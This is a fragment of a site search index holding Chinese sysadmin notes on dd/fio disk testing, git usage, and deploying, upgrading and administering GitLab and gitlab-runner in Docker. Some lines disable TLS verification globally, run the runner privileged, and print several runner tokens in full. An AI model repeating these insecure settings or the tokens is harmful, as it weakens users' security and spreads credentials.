<ul> <li>/dev/zero \u4f2a\u8bbe\u5907\uff0c\u4f1a\u4ea7\u751f\u7a7a\u5b57\u7b26\u6d41\uff0c\u5bf9\u5b83\u4e0d\u4f1a\u4ea7\u751f IO \u3002</li> <li>if \u53c2\u6570\u7528\u6765\u6307\u5b9a dd \u547d\u4ee4\u8bfb\u53d6\u7684\u6587\u4ef6\u3002</li> <li>of \u53c2\u6570\u7528\u6765\u6307\u5b9a dd \u547d\u4ee4\u5199\u5165\u7684\u6587\u4ef6\u3002</li> <li>bs \u53c2\u6570\u4ee3\u8868\u6bcf\u6b21\u5199\u5165\u7684\u5757\u7684\u5927\u5c0f\u3002</li> <li>count \u53c2\u6570\u7528\u6765\u6307\u5b9a\u5199\u5165\u7684\u5757\u7684\u4e2a\u6570\u3002</li> <li>offlag=direc \u53c2\u6570\u6d4b\u8bd5 IO \u65f6\u5fc5\u987b\u6307\u5b9a\uff0c\u4ee3\u8868\u76f4\u63a5\u5199\u5982\u78c1\u76d8\uff0c\u4e0d\u4f7f\u7528 cache \u3002</li> </ul> <p>\u6d4b\u8bd5\u8bfb\u6027\u80fd\u547d\u4ee4\uff1a</p> <pre><code>[root@server-68.2.stage.polex.io var ]$ dd if=test.file of=/dev/null  iflag=direct\n4194304+0 records in\n4194304+0 records out\n2147483648 bytes (2.1 GB) copied, 4.87976 s, 440 MB/s\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u5206\u533a\u7684\u8bfb\u53d6\u901f\u7387\u4e3a 440MB/s</p>"},{"location":"daily/17-io/#fio","title":"\u4e09\u3001fio \u547d\u4ee4","text":"<p>fio \u547d\u4ee4\u662f\u4e13\u95e8\u6d4b\u8bd5 iops \u7684\u547d\u4ee4\uff0c\u6bd4 dd \u547d\u4ee4\u51c6\u786e\uff0cfio \u547d\u4ee4\u7684\u53c2\u6570\u5f88\u591a\uff0c\u8fd9\u91cc\u4e3e\u51e0\u4e2a\u4f8b\u5b50\u4f9b\u5927\u5bb6\u53c2\u8003\uff1a</p> <p>\uff1a</p> <pre><code># \u987a\u5e8f\u8bfb\nfio -filename=/data/io.dbf -direct=1 -iodepth 1 -thread \\\n  -rw=read -ioengine=psync \\\n  -bs=16k -size=2G -numjobs=10 -runtime=60 \\\n  -group_reporting -name=test_r\n\n# \u968f\u673a\u5199\nfio -filename=/data/io.dbf -direct=1 -iodepth 1 -thread \\\n  -rw=randwrite -ioengine=psync \\\n  -bs=16k -size=2G -numjobs=10 -runtime=60 \\\n  -group_reporting -name=test_randw\n\n# \u987a\u5e8f\u5199\nfio -filename=/data/io.dbf -direct=1 -iodepth 1 -thread \\\n  -rw=write -ioengine=psync \\\n  -bs=16k -size=2G -numjobs=10 -runtime=60 \\\n  -group_reporting -name=test_w\n\n# \u6df7\u5408\u968f\u673a\u8bfb\u5199\nfio -filename=/data/io.dbf -direct=1 -iodepth 1 -thread \\\n  -rw=randrw -rwmixread=70 -ioengine=psync \\\n  -bs=16k -size=2G -numjobs=10 -runtime=60 \\\n  -group_reporting -name=test_r_w -ioscheduler=noop\n</code></pre>"},{"location":"daily/18-git/","title":"git","text":""},{"location":"daily/18-git/#_1","title":"\u4e00\u3001\u5e38\u7528\u64cd\u4f5c","text":"<p>\u8d21\u732e\u4ee3\u7801</p> <pre><code>git remote -v\ngit remote add upstream https:/xxx #\u6dfb\u52a0\u6e90\u5173\u8054\u5230\u672c\u5730\ngit fetch upstream #\u66f4\u65b0\u6e90\u81f3\u672c\u5730 \ngit merge upstream/master #\u5408\u5e76\u6e90\u4ee3\u7801\ngit push origin master #\u66f4\u65b0\u5230fork\u6e90\n</code></pre> <p>\u5e9f\u5f03\u5206\u652f</p> <pre><code>git remote prune origin\n</code></pre>"},{"location":"daily/18-git/#11-case-by-case","title":"1.1 case by case","text":"<p>\u5728mac\u3001linux\u53cawindows\u5207\u6362\u7f16\u7a0b\u65f6\uff0c\u51fa\u73b0</p> <pre><code>$ git diff xx.go\nwarning: LF will be replaced by CRLF in approval/types.go.\nThe file will have its original line endings in your working directory.\n</code></pre> <p>\u89e3\u51b3</p> <pre><code>$ git config --global core.autocrlf input\n</code></pre> <p>\u5f53\u79c1\u6709\u8bc1\u4e66\u9a8c\u8bc1\u5931\u8d25</p> <pre><code>$ git config --global sslVerify false\n</code></pre>"},{"location":"daily/18-git/#12","title":"1.2 \u7b80\u6613\u4f7f\u7528","text":"<pre><code>\u5220\u9664\u8fdc\u7a0b\u5206\u652f\ngit push origin --delete serverfix\ngit push origin :serverfix\n</code></pre> <p>Create a new repository on the command line </p> <pre><code>touch README.md\ngit init\ngit add README.md\ngit commit -m \"first commit\"\ngit remote add origin git@github.com:xtso520ok/hadoop-use.git\ngit push -u origin master\n</code></pre> <p>Push an existing repository from the command line </p> <pre><code>git remote add origin git@github.com:xtso520ok/hadoop-use.git\ngit push -u origin master\n</code></pre> <p>by ssh-keygen</p> <pre><code>Global setup:\nSet up git\ngit config --global user.name \"user_name\"\ngit config --global user.email \u00d7\u00d7\u00d7@\u00d7\u00d7\u00d7.com\nAdd your public key\n\nNext steps:\nmkdir project_name\ncd project_name\ngit init\ntouch README\ngit add README\ngit commit -m 'first commit'\ngit remote add origin git@github.com:user_name/project_name.git\ngit push -u origin master\n\nExisting Git Repo?\ncd existing_git_repo\ngit remote add origin git@github.com:user_name/project_name.git\ngit push -u origin master\n\nImporting a Subversion Repo?\nClick here\nWhen you're done:\nContinue \n[ADD/MODIFY/DELETE] by https\ngit status -s\ngit commit -m \"Add README document\"\ngit config --global user.name \"xtso520ok\" \ngit config --global user.email xtso520ok@gmail.com \ngit status -s \ngit push origin master \n</code></pre> <p>set pull rebase</p> <pre><code>git config --global pull.rebase true\ngit config --glbal http.sslverify false\n</code></pre>"},{"location":"daily/18-git/#13","title":"1.3 \u5e38\u7528\u64cd\u4f5c","text":"<pre><code>github\u7684\u63d0\u4ea4\u65b9\u5f0f\n     \uff081\uff09git add .--------------------\u5b58\u50a8\u5230\u672c\u5730\n         git commit -m 'message'-------\u5b58\u50a8\u65f6\u7684\u6807\u8bb0\uff08\u4fee\u6539\u4e86\u54ea\u4e9b\u5730\u65b9\uff0c\u65b9\u4fbf\u4e0b\u6b21\u67e5\u8be2\uff09\n         git pull------------------------\u4e0b\u8f7d\u670d\u52a1\u5668\u4ee3\u7801\n         git push------------------------\u4e0a\u4f20\u4ee3\u7801\u81f3\u670d\u52a1\u5668\n  svn\u670d\u52a1\u5668\u7684\u63d0\u4ea4\u65b9\u5f0f\n   \uff081\uff09git add .  ------------------\u5b58\u50a8\u5230\u672c\u5730\n        git commit -m 'message'--------\u5b58\u50a8\u65f6\u7684\u6807\u8bb0\uff08\u4fee\u6539\u4e86\u54ea\u4e9b\u5730\u65b9\uff0c\u65b9\u4fbf\u4e0b\u6b21\u67e5\u8be2\uff09\n        git svn rebase------------------\u4e0b\u8f7d\u670d\u52a1\u5668\u4ee3\u7801\n        git svn dcommit-----------------\u4e0a\u4f20\u4ee3\u7801\u81f3\u670d\u52a1\u5668\n   \u5176\u4ed6\u76f8\u5173\u7684git\u547d\u4ee4\n\uff081\uff09git branch-------------------\u67e5\u770b\u5f53\u524d\u5c5e\u4e8e\u54ea\u4e2a\u5206\u652f\n    1\u3001\u53ea\u6709\u51b2\u7a81\u5b58\u5728\u65f6\u624d\u4f1a\u4fee\u6539\u5206\u652f\u2014\u2014\u6539\u4e3a\u51b2\u7a81\u518dgit add .\n    2\u3001git rebase \u2013-continue-------------------\u81ea\u52a8\u5408\u5e76\n    3\u3001git checkout \u2013b svn \u65b0\u5efa\u5206\u652f\u540d----------\u65b0\u5efa\u5206\u652f\u5b58\u50a8\u73b0\u6709\u6587\u4ef6\n    4\u3001git branch-------------------------------\u67e5\u770b\u5728\u54ea\u4e2a\u5206\u652f\u4e0b\n    5\u3001git checkout master----------------------\u5c06\u5176\u653e\u5230master\u5206\u652f\u4e0b\n    6\u3001git merge-------------------------------\u6574\u5408\u5206\u652f \n\n    7\u3001git branch -d \u5206\u652f\u540d----------------------\u5220\u9664\u5206\u652f\n\uff082\uff09git checkout + \u4e0a\u4f20\u7684commit\u7f16\u53f7-----------\u5c06\u672c\u5730\u4ee3\u7801\u6062\u590d\u5230\u6b64\u72b6\u6001\n\uff083\uff09git log------------------------------------\u67e5\u770b\u672c\u5730git\u4e0a\u4f20\u65e5\u5fd7\n\uff084\uff09git log -p app/controllers/grids_controller.rb----\u67e5\u770b\u67d0\u4e2a\u6587\u4ef6\u7684\u4fee\u6539\u5386\u53f2\n\uff085\uff09git checkout d0eb6ef3afe8a377943d3cf6f1e9c320c18f6f32\n     app/controllers/charts_controller.rb-----------\u8fd4\u56de\u5230\u8fd9\u4e2a\u7248\u672c\u7684\u6587\u4ef6\uff08\u91cd\u73b0\u9519\u8bef\uff09 \n\n\uff086\uff09git diff \uff0b commit\u7f16\u53f7--------------------------\u67e5\u8be2\u4e0d\u540c\u4ee3\u7801 \n</code></pre>"},{"location":"daily/18-git/#14-git","title":"1.4 git \u5347\u7ea7","text":"<pre><code>GIT_VERSION=2.45.2\ncd /opt\nwget https://mirrors.edge.kernel.org/pub/software/scm/git/git-${GIT_VERSION}.tar.gz\ntar xzf git-${GIT_VERSION}.tar.gz\ncd git-${GIT_VERSION}\n\nyum install -y libcurl-devel\nmake prefix=/usr/local/ all\nmake prefix=/usr/local install\n\ngit config --global user.name \"your_name\"\ngit config --global user.email \"email@address.com\"\ngit config --list\n</code></pre>"},{"location":"daily/18-git/#gitlab","title":"\u4e8c\u3001\u5b89\u88c5gitlab","text":"<p>Reference</p>"},{"location":"daily/18-git/#21-docker-engine","title":"2.1 docker engine","text":"\u672c\u5730\u4f4d\u7f6e \u5bb9\u5668\u4f4d\u7f6e \u4f7f\u7528 <code>$GITLAB_HOME/data</code> <code>/var/opt/gitlab</code> \u7528\u4e8e\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u6570\u636e\u3002 <code>$GITLAB_HOME/logs</code> <code>/var/log/gitlab</code> \u7528\u4e8e\u5b58\u50a8\u65e5\u5fd7\u3002 <code>$GITLAB_HOME/config</code> <code>/etc/gitlab</code> \u7528\u4e8e\u5b58\u50a8\u6781\u72d0GitLab \u914d\u7f6e\u6587\u4ef6\u3002 <pre><code>export GITLAB_HOME=/data1/gitlab\nmkdir -p $GITLAB_HOME\ndocker run --detach \\\n  --hostname git.8ops.top \\\n  --publish 50443:443 --publish 50080:80 --publish 50022:22 \\\n  --name gitlab \\\n  --restart always \\\n  --volume $GITLAB_HOME/config:/etc/gitlab \\\n  --volume $GITLAB_HOME/logs:/var/log/gitlab \\\n  --volume $GITLAB_HOME/data:/var/opt/gitlab \\\n  --shm-size 256m \\\n  registry.gitlab.cn/omnibus/gitlab-jh:latest\n\ndocker logs -f gitlab\ndocker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password\n</code></pre>"},{"location":"daily/18-git/#22-docker-compose","title":"2.2 docker-compose","text":"<pre><code>export GITLAB_HOME=/data1/lib/gitlab\nmkdir -p $GITLAB_HOME\ncat &gt; docker-compose.yml &lt;&lt;EOF\nservices:\n  gitlab:\n    image: 'gitlab/gitlab-ce:17.4.0-ce.0'\n    restart: always\n    hostname: 'git.8ops.top'\n    container_name: gitlab\n    environment:\n      GITLAB_OMNIBUS_CONFIG: |\n        external_url 'https://git.8ops.top'\n    ports:\n      - '443:443'\n      - '80:80'\n      - '22:22'\n      - '9090:9090' # optional\n      - '9093:9093' # optional\n      - '9168:9168' # optional\n      - '3000:3000' # optional\n    volumes:\n      - '\\$GITLAB_HOME/config:/etc/gitlab'\n      - '\\$GITLAB_HOME/logs:/var/log/gitlab'\n      - '\\$GITLAB_HOME/data:/var/opt/gitlab'\n    shm_size: '256m'\nEOF\n\ndocker compose up -d\ndocker compose down\n\ndocker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password\n\ndocker exec -t gitlab gitlab-backup create\ndocker exec -t gitlab gitlab-backup create \\\n    SKIP=artifacts,repositories,registry,uploads,builds,pages,lfs,packages,terraform_state\n\nTODAY=20240924\ndocker exec gitlab gitlab-rake gitlab:backup:create BACKUP=${TODAY} CRON=1\n</code></pre>"},{"location":"daily/18-git/#23-publish-port","title":"2.3 publish port","text":"<pre><code>vim /etc/gitlab/gitlab.rb\n\n\nprometheus['listen_address'] = '0.0.0.0:9090'\n\nalertmanager['listen_address'] = '0.0.0.0:9093'\n\ngitlab_exporter['listen_address'] = '0.0.0.0'\ngitlab_exporter['listen_port'] = '9168'\n\ngrafana['enable'] = true\ngrafana['http_addr'] = '0.0.0.0'\ngrafana['http_port'] = 3000\n</code></pre>"},{"location":"daily/18-git/#24","title":"2.4 \u521d\u59cb\u5bc6\u7801","text":"<pre><code># \u521d\u59cb\u5b89\u88c5\ncat /etc/gitlab/initial_root_password\n\n# \u91cd\u7f6e\ngitlab-rails runner \"user = User.find_by_username('root'); user.password = 'your_new_password'; user.password_confirmation = 'your_new_password'; user.save!\"\n\n# \u754c\u9762\u91cd\u7f6e\n\n# \u914d\u7f6e\u6587\u4ef6\u91cd\u7f6e\ngitlab_rails['initial_root_password'] = 'your_desired_password'\n\ngitlab-ctl reconfigure\n</code></pre>"},{"location":"daily/18-git/#25","title":"2.5 \u90ae\u7bb1\u8bbe\u7f6e","text":"<pre><code># 1. \u7f16\u8f91 GitLab \u914d\u7f6e\u6587\u4ef6\n# \u6253\u5f00 /etc/gitlab/gitlab.rb \u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff1a\n\nvim /etc/gitlab/gitlab.rb\n\n# 2. \u914d\u7f6e\u90ae\u4ef6\u670d\u52a1\u5668\n# \u5728 gitlab.rb \u6587\u4ef6\u4e2d\u627e\u5230 gitlab_rails['smtp_enable'] \u90e8\u5206\uff0c\u6309\u4ee5\u4e0b\u6a21\u677f\u8fdb\u884c\u8bbe\u7f6e\u3002\n\n# \u793a\u4f8b\uff1a\u4f7f\u7528 Gmail \u4f5c\u4e3a SMTP \u670d\u52a1\u5668\n# \u6ce8\u610f\uff1a \u5982\u679c\u4f7f\u7528 Gmail\uff0c\u5efa\u8bae\u4e3a\u4f60\u7684\u8d26\u6237\u542f\u7528\u5e94\u7528\u4e13\u7528\u5bc6\u7801\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u4f7f\u7528\u4f60\u7684\u767b\u5f55\u5bc6\u7801\u3002\u4f60\u53ef\u4ee5\u5728 Gmail \u8bbe\u7f6e\u4e2d\u521b\u5efa\u4e13\u7528\u5bc6\u7801\u3002\ngitlab_rails['smtp_enable'] = true\ngitlab_rails['smtp_address'] = \"smtp.gmail.com\"\ngitlab_rails['smtp_port'] = 587\ngitlab_rails['smtp_user_name'] = \"your-email@gmail.com\"\ngitlab_rails['smtp_password'] = \"your-password\"\ngitlab_rails['smtp_domain'] = \"smtp.gmail.com\"\ngitlab_rails['smtp_authentication'] = \"login\"\ngitlab_rails['smtp_enable_starttls_auto'] = true\ngitlab_rails['smtp_tls'] = false\ngitlab_rails['smtp_openssl_verify_mode'] = 'peer'\n\n\n# \u793a\u4f8b\uff1a\u4f7f\u7528\u5176\u4ed6 SMTP \u670d\u52a1\u5668\uff08\u5982\u4f01\u4e1a\u90ae\u7bb1\uff09\ngitlab_rails['smtp_enable'] = true\ngitlab_rails['smtp_address'] = \"smtp.your-domain.com\"\ngitlab_rails['smtp_port'] = 465\ngitlab_rails['smtp_user_name'] = \"your-email@your-domain.com\"\ngitlab_rails['smtp_password'] = \"your-password\"\ngitlab_rails['smtp_domain'] = \"your-domain.com\"\ngitlab_rails['smtp_authentication'] = \"login\"\ngitlab_rails['smtp_enable_starttls_auto'] = true\ngitlab_rails['smtp_tls'] = true\ngitlab_rails['smtp_openssl_verify_mode'] = 'none'\n\n# 3. \u8bbe\u7f6e\u53d1\u4ef6\u4eba\u5730\u5740\n# \u4f60\u8fd8\u9700\u8981\u8bbe\u7f6e GitLab \u53d1\u9001\u90ae\u4ef6\u65f6\u7684\u53d1\u4ef6\u4eba\u5730\u5740\u3002\u53ef\u4ee5\u5728 gitlab.rb \u4e2d\u627e\u5230\u6216\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\uff1a\ngitlab_rails['gitlab_email_enabled'] = true\ngitlab_rails['gitlab_email_from'] = 'your-email@your-domain.com'\ngitlab_rails['gitlab_email_display_name'] = 'GitLab'\ngitlab_rails['gitlab_email_reply_to'] = 'noreply@your-domain.com'\n\n# 4. \u91cd\u65b0\u914d\u7f6e GitLab\n# \u5728\u5b8c\u6210\u914d\u7f6e\u540e\uff0c\u9700\u8981\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u5e76\u5e94\u7528\u66f4\u6539\uff1a\ngitlab-ctl reconfigure\n\n# 5. \u6d4b\u8bd5\u7535\u5b50\u90ae\u4ef6\u914d\u7f6e\n# \u5b8c\u6210\u914d\u7f6e\u540e\uff0c\u6d4b\u8bd5\u7535\u5b50\u90ae\u4ef6\u529f\u80fd\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 gitlab-rails \u547d\u4ee4\u53d1\u9001\u6d4b\u8bd5\u90ae\u4ef6\uff1a\ngitlab-rails runner \"Notify.test_email('your-email@domain.com', 'Test Email', 'This is a test email message').deliver_now\"\n\n# \ngitlab-ctl reconfigure\ngitlab-rails runner \"Notify.test_email('your-email@domain.com', 'Test Email', 'This is a test email message').deliver_now\"\n</code></pre>"},{"location":"daily/18-git/#25-upgrade","title":"2.5 upgrade","text":"<p>\u9012\u8fdb\u5f0f\u5347\u7ea7</p> <p>Reference</p> <p>\u8de8\u7248\u672c\u5347\u7ea7\u8bb0\u5f55</p> <ul> <li>15.6.2-jh</li> <li>15.11.13</li> <li>16.3.8</li> <li>16.7.9</li> <li>16.11.10</li> <li>17.3.3</li> <li>17.4.0</li> </ul>"},{"location":"daily/18-git/#1","title":"\u6b65\u9aa4 1\uff1a\u5907\u4efd\u73b0\u6709\u6570\u636e","text":"<p>\u5728\u6267\u884c\u4efb\u4f55\u5347\u7ea7\u64cd\u4f5c\u4e4b\u524d\uff0c\u52a1\u5fc5\u5907\u4efd GitLab \u6570\u636e\uff0c\u5305\u62ec\u6570\u636e\u5e93\u3001Git \u4ed3\u5e93\u3001\u914d\u7f6e\u6587\u4ef6\u548c\u5176\u4ed6\u76f8\u5173\u6570\u636e\u3002</p> <p>\u5907\u4efd\u547d\u4ee4\uff1a</p> <ol> <li> <p>\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u5916\u90e8\u5b58\u50a8\u5377\u6302\u8f7d\uff0c\u8bf7\u624b\u52a8\u5907\u4efd\u8fd9\u4e9b\u5377\uff1a</p> </li> <li> <p>Git \u4ed3\u5e93\u6570\u636e (<code>/var/opt/gitlab</code>)</p> </li> <li>GitLab \u914d\u7f6e\u6587\u4ef6 (<code>/etc/gitlab</code>)</li> <li> <p>\u65e5\u5fd7\u6587\u4ef6 (<code>/var/log/gitlab</code>)</p> </li> <li> <p>\u4f7f\u7528 <code>gitlab-backup</code> \u547d\u4ee4\u521b\u5efa\u5907\u4efd\uff08\u8fd0\u884c\u5728 GitLab \u5bb9\u5668\u5185\uff09\uff1a</p> </li> </ol> <pre><code>docker exec -t &lt;gitlab-container-name&gt; gitlab-backup create\n</code></pre> <p>\u8fd9\u4f1a\u521b\u5efa\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\uff0c\u901a\u5e38\u5b58\u50a8\u5728 <code>/var/opt/gitlab/backups</code> \u76ee\u5f55\u4e0b\u3002</p> <ol> <li>\u5907\u4efd\u91cd\u8981\u7684\u914d\u7f6e\u6587\u4ef6\uff1a</li> </ol> <pre><code>docker cp &lt;gitlab-container-name&gt;:/etc/gitlab /path/to/backup/etc-gitlab\ndocker cp &lt;gitlab-container-name&gt;:/var/opt/gitlab /path/to/backup/var-opt-gitlab\ndocker cp &lt;gitlab-container-name&gt;:/var/log/gitlab /path/to/backup/var-log-gitlab\n</code></pre>"},{"location":"daily/18-git/#2-gitlab","title":"\u6b65\u9aa4 2\uff1a\u505c\u6b62\u5e76\u79fb\u9664\u73b0\u6709 GitLab \u5bb9\u5668","text":"<p>\u5728\u5347\u7ea7\u4e4b\u524d\uff0c\u9700\u8981\u505c\u6b62\u5e76\u79fb\u9664\u65e7\u7684 GitLab \u5bb9\u5668\u3002\u505c\u6b62 GitLab \u5bb9\u5668\u4e0d\u4f1a\u5220\u9664\u6570\u636e\uff0c\u56e0\u4e3a\u6570\u636e\u901a\u5e38\u4fdd\u5b58\u5728 Docker \u5377\u4e2d\u3002</p> <pre><code>docker stop &lt;gitlab-container-name&gt;\ndocker rm &lt;gitlab-container-name&gt;\n</code></pre>"},{"location":"daily/18-git/#3-gitlab-ce","title":"\u6b65\u9aa4 3\uff1a\u62c9\u53d6\u65b0\u7684 GitLab CE \u955c\u50cf","text":"<p>\u4ece Docker Hub \u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 GitLab CE \u955c\u50cf\uff1a</p> <pre><code>docker pull gitlab/gitlab-ce:latest\n</code></pre> <p>\u4f60\u4e5f\u53ef\u4ee5\u6307\u5b9a\u67d0\u4e2a\u7248\u672c\uff1a</p> <pre><code>docker pull gitlab/gitlab-ce:&lt;version&gt;\n</code></pre>"},{"location":"daily/18-git/#4-gitlab","title":"\u6b65\u9aa4 4\uff1a\u542f\u52a8\u65b0\u7248\u672c\u7684 GitLab \u5bb9\u5668","text":"<p>\u4f7f\u7528\u4e0e\u539f\u6765\u76f8\u540c\u7684\u914d\u7f6e\u91cd\u65b0\u542f\u52a8\u5bb9\u5668\u3002\u786e\u4fdd\u6302\u8f7d\u76f8\u540c\u7684\u6570\u636e\u5377\uff0c\u4ee5\u4fdd\u8bc1\u6570\u636e\u4e0d\u4f1a\u4e22\u5931\u3002</p> <pre><code>docker run --detach \\\n  --hostname gitlab.example.com \\\n  --publish 443:443 --publish 80:80 --publish 22:22 \\\n  --name gitlab \\\n  --restart always \\\n  --volume /path/to/gitlab/config:/etc/gitlab \\\n  --volume /path/to/gitlab/logs:/var/log/gitlab \\\n  --volume /path/to/gitlab/data:/var/opt/gitlab \\\n  gitlab/gitlab-ce:latest\n</code></pre> <ul> <li>\u5c06 <code>/path/to/gitlab/config</code>\u3001<code>/path/to/gitlab/logs</code>\u3001<code>/path/to/gitlab/data</code> \u66ff\u6362\u4e3a\u4f60\u5b9e\u9645\u7684\u6570\u636e\u5377\u8def\u5f84\u3002</li> <li>\u66f4\u65b0 <code>--hostname</code> \u53c2\u6570\u4ee5\u5339\u914d\u4f60\u7684 GitLab \u5b9e\u4f8b\u7684\u57df\u540d\u3002</li> </ul>"},{"location":"daily/18-git/#5","title":"\u6b65\u9aa4 5\uff1a\u68c0\u67e5\u5bb9\u5668\u72b6\u6001","text":"<p>\u5347\u7ea7\u5b8c\u6210\u540e\uff0c\u68c0\u67e5\u5bb9\u5668\u662f\u5426\u6b63\u5e38\u8fd0\u884c\uff0c\u5e76\u901a\u8fc7\u65e5\u5fd7\u67e5\u770b\u662f\u5426\u6709\u9519\u8bef\uff1a</p> <pre><code>docker logs -f gitlab\n</code></pre> <p>\u786e\u4fdd\u670d\u52a1\u542f\u52a8\u6210\u529f\uff0c\u5e76\u4e14 GitLab \u80fd\u591f\u6b63\u5e38\u8bbf\u95ee\u3002</p>"},{"location":"daily/18-git/#6","title":"\u6b65\u9aa4 6\uff1a\u9a8c\u8bc1\u5347\u7ea7","text":"<p>\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee GitLab \u754c\u9762\uff0c\u786e\u4fdd\u4e00\u5207\u5de5\u4f5c\u6b63\u5e38\u3002\u4f60\u53ef\u4ee5\u5728 GitLab \u7ba1\u7406\u754c\u9762\u4e2d\u67e5\u770b\u5f53\u524d\u7684 GitLab \u7248\u672c\uff0c\u786e\u8ba4\u5347\u7ea7\u662f\u5426\u6210\u529f\u3002</p> <pre><code>http://&lt;gitlab-hostname&gt;\n</code></pre>"},{"location":"daily/18-git/#7","title":"\u6b65\u9aa4 7\uff1a\u6e05\u7406\u65e7\u955c\u50cf\uff08\u53ef\u9009\uff09","text":"<p>\u786e\u8ba4\u5347\u7ea7\u6210\u529f\u540e\uff0c\u4f60\u53ef\u4ee5\u5220\u9664\u65e7\u7684 Docker \u955c\u50cf\u4ee5\u91ca\u653e\u7a7a\u95f4\uff1a</p> <pre><code>docker image prune\n</code></pre>"},{"location":"daily/18-git/#_2","title":"\u8865\u507f\u63aa\u65bd","text":"<pre><code># \u67e5\u770b\u542f\u52a8\u670d\u52a1\ndocker exec gitlab gitlab-ctl status\n\n# \u542f\u52a8\u67d0\u670d\u52a1/\u91cd\u542f\ndocker exec gitlab gitlab-ctl start &lt;app&gt;\ndocker exec gitlab gitlab-ctl restart\n\n# \u67e5\u770b\u65e5\u5fd7\ntail -f logs/\n\n# \u67e5\u770b\u6570\u636e\u8fc1\u79fb\ndocker exec gitlab gitlab-rake db:migrate\n\n# \u91cd\u7f6e\u6743\u9650\ndocker exec -it gitlab update-permissions\n\n# \u68c0\u67e5Redis\u72b6\u6001\ndocker exec -it gitlab gitlab-ctl status redis\n\n# \u68c0\u67e5SideKiq\u72b6\u6001\ndocker exec -it gitlab gitlab-ctl status sidekiq\n\n# \u6e05\u7406\u7f13\u5b58\ndocker exec -it gitlab gitlab-rake cache:clear\ndocker exec -it gitlab gitlab-ctl restart\n\n# \u4fee\u590d\u6587\u4ef6\u6743\u9650\ndocker exec -it gitlab gitlab-ctl reconfigure\n\n# \u624b\u52a8\u4fee\u590d\nchown -R git:git /var/opt/gitlab\nchown -R gitlab-www:gitlab-www /var/log/gitlab\n\n# \u5f3a\u5236\u5347\u7ea7\ngitlab-ctl upgrade\n\n# \u56de\u6eda\ngitlab-ctl stop\ngitlab-rake gitlab:backup:restore BACKUP=&lt;\u5907\u4efd\u6587\u4ef6\u540d&gt;\ngitlab-ctl restart\n</code></pre>"},{"location":"daily/18-git/#gitlab-runner","title":"\u4e09\u3001\u5b89\u88c5gitlab-runner","text":"<p>Reference</p>"},{"location":"daily/18-git/#31-docker-engine","title":"3.1 docker engine","text":"<pre><code># \u7b2c\u4e00\u6b65\uff0c\u542f\u52a8 gitlab-runner \u5b9e\u4f8b\nmkdir -p /ops/lib/gitlab-runner/config\ndocker run -d --name gitlab-runner-01 --restart always \\\n  -v /ops/lib/gitlab-runner/config:/etc/gitlab-runner \\\n  -v /usr/bin/docker:/usr/bin/docker \\\n  -v /var/run/docker.sock:/var/run/docker.sock \\\n  -v /ops/lib/gitlab-runner/cache:/cache \\\n  -v /ops/lib/gitlab-runner/npm:/root/.npm \\\n  -e 'CA_CERTIFICATES_PATH=\"/etc/gitlab-runner/certs/ca.crt\"' \\ # \u53d7\u4fe1\u79c1\u6709CA\n  hub.8ops.top/build/gitlab-runner:ubuntu-v17.4.0\n\n# \u7b2c\u4e8c\u6b65\uff0c\u8fdb\u5165gitlab console \u6ce8\u518c\u5b9e\u4f8b\u5e76\u83b7\u53d6\u6ce8\u518c\u547d\u4ee4 \uff08Admin Area -&gt; Runners\uff09\ngitlab-runner register  --url https://git.8ops.top  --token glrt-zvyQjQV7FDszMetH1Yxu\n\n# \u7b2c\u4e09\u6b65\uff0c\u8fdb\u5165gitlab-runner\u5b9e\u4f8b\u8fdb\u884c\u6ce8\u518c\ndocker exec -it gitlab-runner bash\n\nroot@gitlab-runner:/# gitlab-runner register  --url https://git.8ops.top  --token glrt-Kdv9Ad4PHqJGyoyKQCp5\nRuntime platform                                    arch=amd64 os=linux pid=1431 revision=b92ee590 version=17.4.0\nRunning in system-mode.\n\nEnter the GitLab instance URL (for example, https://gitlab.com/):\n[https://git.8ops.top]:\nVerifying runner... is valid                        runner=Kdv9Ad4PH\nEnter a name for the runner. This is stored only in the local config.toml file:\n[gitlab-runner]:\nEnter an executor: ssh, virtualbox, docker-windows, kubernetes, instance, custom, shell, parallels, docker, docker+machine, docker-autoscaler:\ndocker\nEnter the default Docker image (for example, ruby:2.7):\n\nEnter the default Docker image (for example, ruby:2.7):\nhub.8ops.top/build/alpine:3\nRunner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded!\n\nConfiguration (with the authentication token) was saved in \"/etc/gitlab-runner/config.toml\"\n\n# \u67e5\u770b\u81ea\u52a8\u751f\u6210\u914d\u7f6e\u6587\u4ef6\nroot@gitlab-runner:/# cat /etc/gitlab-runner/config.toml\nconcurrent = 1\ncheck_interval = 0\nconnection_max_age = \"15m0s\"\nshutdown_timeout = 0\n\n[session_server]\n  session_timeout = 1800\n\n[[runners]]\n  name = \"gitlab-runner\"\n  url = \"https://git.8ops.top\"\n  id = 18\n  token = \"glrt-Kdv9Ad4PHqJGyoyKQCp5\"\n  token_obtained_at = 2024-09-26T03:24:18Z\n  token_expires_at = 0001-01-01T00:00:00Z\n  executor = \"docker\"\n  [runners.custom_build_dir]\n  [runners.cache]\n    MaxUploadedArchiveSize = 0\n    [runners.cache.s3]\n    [runners.cache.gcs]\n    [runners.cache.azure]\n  [runners.docker]\n    helper_image = \"hub.8ops.top/build/gitlab-runner-helper:x86_64-v17.4.0\"\n    tls_verify = false\n    image = \"hub.8ops.top/build/alpine:3\"\n    privileged = true\n    disable_entrypoint_overwrite = false\n    oom_kill_disable = false\n    disable_cache = false\n    volumes = [\"/cache\"]\n    shm_size = 0\n    network_mtu = 0\n</code></pre>"},{"location":"daily/18-git/#32-docker-compose","title":"3.2 docker-compose","text":"<pre><code># \u7b2c\u4e00\u6b65\uff0c\u542f\u52a8 gitlab-runner \u5b9e\u4f8b\nmkdir -p /opt/lib/gitlab-runner/{config,cache,npm}\ncd 